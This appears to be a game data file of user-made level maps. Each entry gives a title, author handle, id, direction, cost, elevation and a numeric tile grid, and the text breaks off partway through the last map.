maps.push({name="Under the Bridge",author="sivi",id="#1669642026",direction="forward",cost=311,elevation=0,map=[0,0,24,22,22,24,2,2,22,24,0,0,0,0,0,0,0,0,0,0,0,24,20,20,18,90,12,12,12,20,22,24,24,22,24,22,24,22,0,0,22,20,94,12,12,12,12,12,12,90,20,18,20,18,20,18,20,20,24,0,24,18,90,12,12,12,12,12,12,12,12,12,90,12,12,90,94,18,18,24,22,20,12,12,90,12,12,12,12,12,12,12,12,12,12,12,12,90,20,22,24,9998,0,0,0,0,12,90,12,12,12,9998,93,93,9998,12,12,12,18,24,22,77,0,0,5,0,0,0,0,0,90,12,46,46,12,90,0,0,0,0,22,77,0,0,0,0,0,5,0,0,0,15,32,32,15,0,0,154,0,0,22,77,0,0,0,5,0,0,0,5,0,0,33,33,0,0,0,5,145,0,22,77,0,5,0,0,0,5,0,0,0,5,34,34,0,0,0,153,0,0,22,77,0,0,0,0,0,0,0,5,0,0,34,34,0,0,0,157,0,0,24,9998,0,141,0,0,5,0,0,0,0,5,34,34,0,0,0,0,0,0,24,20,12,12,12,0,0,141,0,0,0,0,33,33,0,0,0,0,0,0,22,18,90,12,12,90,12,12,12,0,0,15,32,32,15,0,90,12,18,22,22,20,12,12,12,12,12,12,12,12,90,12,46,46,12,12,12,12,18,24,24,18,12,12,12,12,12,12,12,12,12,9998,93,93,9998,12,12,12,20,22,22,18,94,90,12,12,12,12,12,12,12,12,12,12,12,12,12,90,18,24,0,22,20,18,12,12,12,12,12,90,12,12,90,12,12,90,94,18,20,22,0,0,24,22,20,12,12,12,12,18,18,20,18,20,18,20,20,22,24,0,0,0,0,0,24,22,2,2,24,22,24,22,22,24,22,24,24,0,0,0]});
maps.push({name="Never Lucky",author="ZpLit",id="#1669667573",direction="forward",cost=319,elevation=0,map=[0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,24,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,24,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,14,14,14,14,195,76,83,14,76,83,14,76,83,94,94,1,0,0,0,1,14,14,90,14,195,76,83,14,76,83,14,76,83,94,94,1,0,0,0,1,14,14,14,14,195,76,83,14,76,83,14,76,83,94,94,1,0,0,0,1,14,14,14,14,195,76,83,14,76,83,14,76,83,94,94,1,0,0,0,1,14,14,14,90,24,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,14,14,14,14,1,24,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,90,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,199,97,1,0,0,0,1,199,199,199,14,14,14,14,14,14,14,14,14,14,14,199,1,0,0,0,1,93,93,199,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,1,93,93,199,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,88,2,2,88,1,0]});
maps.push({name="Under And Over It",author="ZpLit",id="#1669673394",direction="left",cost=262,elevation=-6,map=[0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,2,2,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,34,34,34,0,0,0,34,34,34,0,0,0,34,34,34,0,0,0,0,0,35,35,35,0,0,0,34,34,34,0,0,0,35,35,35,0,0,0,0,0,36,36,36,0,0,0,34,34,34,0,0,0,36,36,36,0,0,0,0,0,37,37,37,0,0,0,34,34,34,0,0,0,37,37,37,0,0,0,0,0,38,38,38,0,0,0,33,33,33,0,0,0,38,38,38,0,0,0,0,0,38,38,38,0,0,0,32,32,32,0,0,0,38,38,38,0,0,0,0,0,37,37,37,0,0,0,31,31,31,0,0,0,37,37,37,0,0,0,0,0,36,36,36,0,0,0,30,30,30,0,0,0,36,36,36,0,0,0,0,0,35,35,35,0,0,0,29,29,29,0,0,0,35,35,35,0,0,0,0,0,34,34,34,0,0,0,28,28,28,0,0,0,34,34,34,0,0,1,1,1,14,14,14,1,1,1,108,108,108,1,1,1,14,14,14,0,0,88,8,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,93,1,0,2,8,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,94,1,0,2,8,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,94,1,0,88,8,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,93,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="OverClownfidence",author="ZpLit",id="#1669676177",direction="left",cost=293,elevation=0,map=[88,6,9,9,87,0,0,87,8,8,8,7,7,7,87,0,96,6,2,2,2,6,9,90,9,0,0,8,8,8,8,7,7,7,7,0,5,6,6,6,2,6,9,9,9,0,0,8,8,8,8,7,90,7,7,0,188,6,6,6,88,6,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,90,6,0,0,9,9,9,0,0,8,8,90,0,0,7,7,7,0,0,6,6,6,0,0,90,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,90,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,90,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,96,8,90,8,0,0,7,7,7,0,0,6,6,90,0,0,90,9,9,0,7,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,188,8,8,8,0,0,7,90,7,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,90,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,0,0,8,8,8,0,0,7,7,7,0,0,6,6,6,0,0,9,9,9,9,8,90,8,8,0,189,7,7,7,7,6,90,6,6,0,0,9,97,9,9,8,8,8,8,0,6,7,7,7,7,6,6,6,6,0,0,87,9,9,9,8,8,8,87,0,96,87,7,7,7,6,6,6,87]});
maps.push({name="Watch Your Feet",author="sivi",id="#1669692159",direction="forward",cost=348,elevation=7,map=[0,0,0,0,0,0,0,1,105,2,2,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,105,105,90,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,5,5,5,5,1,1,1,1,0,0,0,0,0,0,0,0,1,93,11,90,184,184,184,184,90,11,93,1,0,0,0,0,0,0,0,0,1,11,132,11,184,184,184,184,11,134,11,1,0,0,0,0,0,0,0,0,1,90,11,11,184,184,184,184,11,11,90,1,0,0,0,0,0,0,1,1,1,1,1,1,184,184,184,184,1,1,1,1,1,1,0,0,0,0,1,20,67,187,111,199,184,184,184,184,199,111,186,67,20,1,0,0,0,0,1,20,67,187,111,199,184,184,184,184,199,111,186,67,20,1,0,0,0,0,1,20,67,187,111,199,184,184,184,184,199,111,186,67,20,1,0,0,0,0,1,20,67,187,111,199,184,184,184,184,199,111,186,67,20,1,0,0,0,0,1,20,67,187,111,199,184,184,184,184,199,111,186,67,20,1,0,0,0,0,1,1,1,1,1,1,184,184,184,184,1,1,1,1,1,1,0,0,0,0,0,0,1,90,45,45,184,184,184,184,45,45,90,1,0,0,0,0,0,0,0,0,1,45,133,45,184,184,184,184,45,131,45,1,0,0,0,0,0,0,0,0,1,94,45,90,184,184,184,184,90,45,94,1,0,0,0,0,0,0,0,0,1,11,11,90,11,11,11,11,90,11,11,1,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,1,90,88,12,12,12,12,12,12,88,90,1,0,0,0,0,0,0,0,0,1,1,1,1,112,2,2,112,1,1,1,1,0,0,0,0]});
maps.push({name="Delay The Trigger",author="ZpLit",id="#1669754867",direction="right",cost=295,elevation=0,map=[0,0,0,0,0,0,1,14,2,2,14,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,14,14,14,88,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,14,14,14,2,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,14,14,14,2,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,14,14,14,88,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,1,1,1,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,14,9998,9998,14,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,9998,16,97,9998,1,14,14,14,14,1,0,0,0,0,0,0,0,1,1,1,96,96,96,96,1,14,14,14,14,1,1,1,0,0,0,0,1,114,94,195,14,14,14,14,14,14,14,14,14,195,93,114,1,0,0,0,1,114,94,195,14,14,14,14,14,14,14,14,14,195,93,114,1,0,0,0,1,114,94,195,14,14,14,14,14,14,14,14,14,195,93,114,1,0,0,0,1,114,94,195,14,14,14,14,14,14,14,14,14,195,93,114,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="To Press Or Not To",author="ZpLit",id="#1669769265",direction="forward",cost=235,elevation=0,map=[0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,0,14,14,14,14,66,69,68,68,68,69,66,14,14,0,0,0,0,0,0,0,195,195,195,195,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,96,96,96,96,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,96,96,96,96,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,0,0,0,195,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,14,1,1,1,1,1,1,1,14,94,0,0,0,0,0,0,0,14,14,14,14,34,34,34,34,34,34,34,14,94,0,0,0,0,0,0,0,14,14,14,14,34,34,34,34,34,34,34,14,94,0,0,0,0,126,0,0,95,95,95,95,1,1,1,1,1,1,1,127,94,0,0,0,0,97,0,0,95,2,2,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Charge Over The Hill",author="ZpLit",id="#1669790580",direction="right",cost=277,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,15,15,15,15,15,15,0,0,0,0,0,0,0,0,14,14,0,0,15,15,15,16,16,16,16,15,15,15,15,0,0,0,0,0,14,14,14,15,15,16,16,17,17,17,17,17,16,16,15,15,0,0,0,0,14,14,15,15,16,16,17,17,18,18,18,18,17,17,16,15,0,0,0,0,14,15,15,16,16,17,18,18,20,18,18,18,18,17,16,15,15,0,0,0,15,15,16,16,17,17,20,21,20,20,18,18,18,17,16,16,15,0,0,0,15,15,16,17,17,19,21,22,22,20,19,18,18,17,17,16,15,0,0,0,15,16,16,17,18,21,23,23,23,20,19,19,18,18,17,16,15,0,0,0,15,16,17,18,19,21,23,24,23,20,19,19,18,18,17,16,15,0,0,0,15,16,17,18,19,22,23,24,21,20,20,19,18,18,17,16,15,0,0,0,15,16,17,17,18,22,22,22,22,21,20,19,18,17,17,16,15,0,0,0,0,15,16,17,18,22,22,21,21,20,19,18,18,17,16,16,15,0,0,0,0,15,16,17,19,18,21,20,20,20,18,18,17,16,16,15,15,0,0,0,0,15,16,17,19,18,18,18,18,18,17,17,17,16,15,15,0,0,0,0,0,15,15,16,17,19,19,19,17,17,16,16,16,15,15,0,0,0,0,0,0,0,15,15,16,17,17,17,16,16,16,15,15,15,14,0,0,0,0,0,0,0,0,15,15,16,16,16,16,15,15,15,14,14,14,14,14,2,0,0,0,0,0,0,15,15,15,15,15,15,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Spelunking",author="sivi",id="#1669816938",direction="left",cost=326,elevation=0,map=[0,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,11,11,11,11,90,11,11,11,90,11,11,1,90,111,111,111,1,1,1,90,11,11,11,11,11,11,11,11,11,11,11,111,111,111,111,111,90,1,1,94,11,11,11,11,11,11,11,11,11,11,11,111,111,111,111,111,111,1,1,11,11,11,11,11,11,11,11,11,11,11,90,1,1,111,111,111,111,1,1,1,90,11,11,90,11,9998,11,9998,12,0,0,1,1,0,0,0,0,1,1,1,1,1,0,0,12,9998,11,9998,12,0,0,0,1,0,0,1,0,1,1,124,77,0,0,0,32,9998,31,9998,32,0,154,0,105,0,12,13,0,1,1,124,77,0,0,0,32,9998,31,9998,32,0,8,186,105,0,0,0,0,1,1,124,77,0,0,0,32,9998,31,9998,32,0,153,0,105,0,0,0,15,1,1,124,77,0,0,0,32,9998,31,9998,32,0,157,0,1,0,0,0,1,1,1,124,77,0,0,0,12,9998,11,9998,12,0,0,1,1,0,16,0,0,1,1,1,1,1,1,1,12,9998,11,9998,11,1,1,1,1,0,0,0,0,1,1,90,111,88,1,1,11,11,11,11,11,1,1,1,1,1,1,0,0,1,2,111,111,111,111,95,11,11,11,11,11,117,93,0,0,0,0,0,0,1,2,111,111,111,111,95,11,11,11,11,90,117,93,0,16,15,0,0,12,1,1,90,111,111,90,1,90,11,11,11,11,117,93,0,0,0,0,1,13,1,1,1,1,1,1,1,1,11,90,11,11,1,1,1,0,0,0,0,0,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,14,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0]});
maps.push({name="Overwall",author="ZpLit",id="#1669864740",direction="forward",cost=212,elevation=0,map=[0,0,2,2,0,0,0,0,3,24,24,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,185,185,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,1,125,125,1,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,5,0,0,0,0,0,0,0,0,5,5,5,5,105,5,5,105,5,5,5,5,0,0,0,0,0,0,0,0,5,0,0,0,1,65,65,1,0,0,0,5,0,0,0,0,0,0,0,0,5,0,0,0,1,131,131,1,0,0,0,5,0,0,0,0,0,0,0,0,5,0,0,0,1,23,23,1,0,0,0,5,0,0,0,0,0,0,0,0,5,5,5,5,105,5,5,105,5,5,5,5,0,0,0,0,0,0,0,0,5,0,0,0,1,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,187,20,131,131,20,186,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,140,140,140,140,5,5,5,5,5,5,0,0,0,0,0,0,0,1,1,1,5,65,65,5,1,1,1,0,0,91,0,0,0,0,0,0,0,0,135,65,1,1,1,1,65,135,0,0,0,91,0,0,0,0,0,0,0,0,135,65,65,65,65,65,65,135,0,0,0,91,0,0,0,0,0,0,0,0,5,199,199,199,199,199,199,5,0,0,0,91,0,0,0,0,0,0,0,0,5,105,5,5,5,5,105,5,5,5,5,5,0,0,0,0,0,0,0,0,1,1,88,2,2,88,1,1,0,0,0,0,0,0]});
maps.push({name="pls no castle theme",author="sivi",id="#1669907542",direction="forward",cost=327,elevation=6,map=[1,1,1,1,1,1,1,1,1,1,1,1,2,2,108,1,1,1,1,1,1,0,0,0,0,0,189,0,0,0,0,0,108,108,108,1,0,0,0,0,1,189,97,0,97,0,6,0,187,6,97,0,108,108,90,1,0,154,0,0,1,6,6,0,6,0,97,0,0,0,0,0,108,108,108,1,0,8,0,0,1,97,188,0,145,0,0,0,0,97,0,0,108,108,108,1,0,153,0,0,1,0,0,97,6,145,6,97,0,6,0,0,108,108,90,1,0,157,0,0,1,0,0,0,0,0,0,0,0,188,0,0,108,108,108,1,0,0,0,0,1,93,93,93,1,1,1,1,1,1,1,1,108,108,108,1,1,1,1,0,1,9,9,9,1,24,24,24,24,24,24,1,108,108,108,108,109,90,1,1,1,3,3,3,1,77,77,77,77,77,77,1,90,108,108,108,109,109,109,1,1,17,17,17,1,0,0,0,0,0,0,1,1,108,90,108,109,109,90,1,1,114,114,114,1,0,0,0,0,0,0,1,1,1,1,1,109,109,109,1,1,90,114,114,95,14,14,14,14,14,14,113,112,111,110,109,109,109,109,1,1,114,114,114,95,14,90,14,14,90,14,113,112,111,110,109,109,109,90,1,1,114,114,114,95,14,14,14,14,14,14,113,112,111,110,109,90,109,1,1,1,114,114,90,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,1,114,114,114,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,114,114,114,1,77,77,77,77,77,77,1,0,0,0,0,0,0,0,0,1,114,114,114,1,24,24,24,24,24,24,1,0,0,0,0,0,0,0,0,1,90,2,2,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Trust Issues",author="sivi",id="#1669917923",direction="right",cost=267,elevation=0,map=[19,90,2,2,90,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,90,14,14,14,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,14,14,14,90,19,0,0,0,0,0,0,0,0,0,19,131,53,93,9998,19,14,14,14,14,95,0,0,0,0,0,0,0,0,0,53,53,53,93,19,19,90,14,14,14,95,0,91,9,186,91,187,9,91,0,53,53,53,93,19,19,14,14,14,14,95,0,0,0,0,0,0,0,0,0,53,53,53,93,19,19,14,14,14,90,19,0,0,0,0,0,0,0,0,0,19,53,53,93,19,19,14,14,14,14,0,0,0,0,0,0,0,0,0,0,19,199,199,199,19,19,90,14,14,14,0,0,0,0,0,0,0,0,0,0,0,53,53,53,0,19,14,14,14,14,0,0,0,0,0,0,0,19,0,0,0,188,188,188,0,19,14,14,14,14,90,14,14,14,14,90,14,95,14,14,14,90,14,14,90,19,14,14,14,14,14,14,14,14,14,14,14,95,14,14,14,14,14,14,2,19,90,14,14,14,14,14,14,14,14,14,14,95,14,14,14,14,14,14,2,0,19,14,14,90,14,14,14,90,14,14,14,95,14,90,14,132,14,14,90,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,189,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,153,11,154,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,157,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Tower of bling bling",author="Luffaren",id="#1669919110",direction="right",cost=352,elevation=0,map=[0,5,24,2,2,24,5,5,5,5,0,189,0,0,189,0,189,0,0,0,0,9998,90,24,24,90,9998,24,24,5,0,44,93,0,44,183,44,183,0,0,0,5,5,5,5,5,5,24,24,5,0,0,1,1,1,1,1,1,0,0,0,5,65,65,65,65,5,5,5,1,0,77,1,24,24,93,93,1,44,100,0,5,24,24,5,24,24,5,0,0,0,77,1,151,24,24,24,1,0,0,0,94,24,24,5,24,24,5,0,0,0,77,1,0,0,93,93,1,0,0,0,1,5,5,5,5,5,5,5,9998,0,0,1,123,1,1,1,1,44,0,0,0,5,65,65,65,5,24,24,67,0,0,0,0,0,0,44,0,0,0,0,0,5,24,24,65,5,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,5,24,24,65,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,1,5,5,0,0,0,0,0,0,0,3,18,141,24,0,9998,5,5,65,65,24,24,5,0,0,0,9998,67,67,9998,5,5,9998,24,0,67,24,24,65,65,89,24,5,5,67,67,5,24,24,5,65,24,89,24,0,67,24,24,65,65,65,65,5,65,24,24,5,24,24,5,65,24,24,24,0,9998,5,5,5,5,5,5,5,65,89,24,5,65,65,5,65,65,24,2,0,0,94,5,5,5,24,24,5,65,65,65,1,5,5,94,5,65,24,2,0,0,5,24,24,5,24,24,5,5,5,5,5,65,24,24,5,65,24,24,0,0,5,24,24,5,5,5,5,94,24,24,5,65,24,24,5,65,89,24,0,0,1,5,5,5,0,0,0,5,24,24,5,5,5,5,5,5,9998,24,0,0,0,0,0,0,0,0,0,0,67,67,0,0,0,0,3,18,141,24]});
maps.push({name="Weeeeeeeeeeeeeeee",author="Luffaren",id="#1669922140",direction="right",cost=643,elevation=-6,map=[2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,189,189,0,0,15,15,1,187,9,9,186,0,0,0,0,0,0,0,0,0,9,9,0,0,15,15,15,1,162,162,162,162,162,162,162,162,162,162,162,162,160,160,9,186,15,15,15,1,162,162,162,162,162,162,162,162,162,162,162,162,160,160,9,186,1,127,127,1,162,162,162,162,162,162,162,162,162,162,162,162,160,160,9,186,1,0,0,1,159,159,162,162,162,162,162,162,162,162,162,160,160,160,0,0,1,0,0,1,159,159,159,1,1,1,1,1,1,1,1,160,160,160,0,0,1,0,0,1,159,159,159,1,1,160,0,0,161,161,161,161,160,160,0,0,1,0,0,1,0,0,0,0,1,160,0,0,161,161,161,161,160,160,0,0,1,0,0,1,0,0,0,77,1,160,0,0,0,0,0,0,160,160,0,0,1,189,189,1,0,0,0,0,1,0,160,160,161,161,161,161,161,161,9,186,1,9,9,1,158,158,158,0,1,0,160,160,161,161,161,161,161,161,9,186,1,160,160,1,159,159,159,0,1,160,160,160,1,1,1,1,1,1,1,1,1,160,160,1,159,159,159,0,1,160,65,65,65,65,65,65,65,162,162,67,1,160,160,1,159,159,159,0,1,160,65,65,65,65,65,65,65,65,162,67,1,160,160,1,159,159,159,189,1,65,65,65,65,65,65,65,65,65,9,2,1,162,162,162,159,159,159,9,1,65,65,65,65,65,65,65,65,65,9,2,1,162,162,162,159,159,159,9,1,14,9,94,65,65,65,65,65,65,9,67,1,1,1,1,9,9,9,188,1,14,14,9,9,9,9,9,9,9,9,67,0,0,0,0,188,188,188,0,0,93,14,0,0,0,67,67,67,0,0,0]});
maps.push({name="All Along the Watcht",author="sivi",id="#1669995800",direction="left",cost=422,elevation=7,map=[22,7,2,2,7,24,22,24,20,22,24,20,22,22,24,20,0,0,0,0,20,7,7,7,7,75,90,7,7,90,7,75,90,7,7,90,22,0,0,0,22,90,7,85,7,75,7,7,7,85,7,75,7,7,7,7,88,24,0,0,24,7,7,7,7,75,7,85,7,7,7,75,7,85,7,87,7,90,22,0,22,189,0,0,0,77,0,0,0,0,0,77,0,0,7,7,7,7,94,20,20,36,0,0,0,0,34,183,183,183,0,0,0,0,0,7,85,7,90,24,22,93,183,183,183,183,188,20,199,54,199,199,20,0,0,0,7,7,7,22,22,20,199,199,199,199,20,90,54,54,54,54,90,20,0,77,75,75,75,22,24,90,54,54,54,54,54,54,132,54,54,132,54,199,0,0,7,7,90,24,2,54,54,54,54,54,54,54,54,54,54,54,54,199,0,0,7,85,7,22,2,54,54,54,54,54,54,54,54,54,54,54,54,199,0,0,7,7,7,24,24,90,54,54,54,54,54,54,132,54,54,132,54,199,0,0,85,7,90,20,20,20,199,199,199,199,20,90,54,54,54,54,90,20,0,77,75,75,75,22,22,93,183,183,183,183,189,20,199,199,54,199,20,0,0,0,7,7,7,20,20,36,0,0,0,0,34,183,183,183,183,0,0,0,0,7,85,7,90,24,22,188,0,0,0,77,0,0,0,0,0,77,0,0,7,7,7,7,94,22,24,7,7,85,7,75,7,85,7,7,7,75,7,85,7,87,7,90,24,0,20,90,131,7,7,75,7,7,7,85,7,75,7,7,7,7,88,20,153,0,22,7,7,90,7,75,90,7,7,90,7,75,90,7,7,90,22,154,5,0,0,22,24,20,24,22,20,24,22,22,20,24,20,22,20,24,0,0,0,0]});
maps.push({name="3 ways out",author="Denislafff",id="#1670004328",direction="forward",cost=222,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,65,65,5,5,5,5,5,5,5,0,0,0,104,5,5,5,5,5,5,5,65,65,5,5,5,5,5,5,5,104,0,0,0,6,6,0,0,0,0,5,5,5,5,0,0,0,0,6,6,0,0,0,0,7,7,0,0,0,0,5,5,5,5,0,0,0,0,7,7,0,0,0,0,95,95,0,0,0,0,95,95,95,95,0,0,0,0,95,95,0,0,0,0,7,7,0,0,0,0,5,5,5,5,0,0,0,0,7,7,0,0,0,0,8,8,0,0,0,0,103,103,103,103,0,0,0,0,8,8,0,0,0,0,9,9,0,0,0,0,5,5,5,5,0,0,0,0,9,9,0,0,0,102,10,10,0,0,0,0,101,101,101,101,0,0,0,0,10,10,102,0,0,0,11,11,65,65,65,65,5,5,5,5,65,65,65,65,11,11,0,0,0,100,12,12,65,65,65,65,5,5,5,5,65,65,65,65,12,12,100,0,0,0,0,0,0,0,0,0,93,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Water plane",author="Luffaren",id="#1670025504",direction="forward",cost=528,elevation=-19,map=[0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,66,66,1,1,1,1,1,1,1,1,0,0,1,65,65,65,91,5,93,1,66,66,1,94,5,91,65,65,65,1,0,0,1,65,65,65,91,5,93,1,69,69,1,94,5,91,65,65,65,1,0,0,1,65,1,1,1,1,1,1,69,69,1,1,1,1,1,1,65,1,0,67,65,65,65,65,65,65,65,5,66,66,5,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,5,66,66,5,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,5,5,5,5,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,93,5,65,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,93,5,65,67,67,65,65,65,65,65,65,65,65,5,5,65,65,65,65,65,65,65,65,67,67,65,5,94,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,67,65,5,94,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,5,5,5,5,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,5,2,2,5,65,65,65,65,65,65,65,67]});
maps.push({name="Final FrostDrake",author="IV",id="#1670073266",direction="forward",cost=447,elevation=-11,map=[0,0,0,0,0,0,0,0,20,2,2,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,199,0,20,20,20,20,20,102,20,20,20,20,20,20,0,0,0,0,0,199,199,0,101,101,101,101,101,101,101,101,101,101,101,101,0,199,199,0,199,199,199,0,20,20,20,20,20,20,20,20,20,20,20,20,0,199,199,0,199,199,199,0,24,24,24,20,20,97,20,20,20,24,24,24,0,199,199,0,199,199,0,0,0,0,24,96,96,96,96,96,96,24,0,0,0,199,199,199,199,199,199,0,0,0,23,19,19,19,19,19,19,23,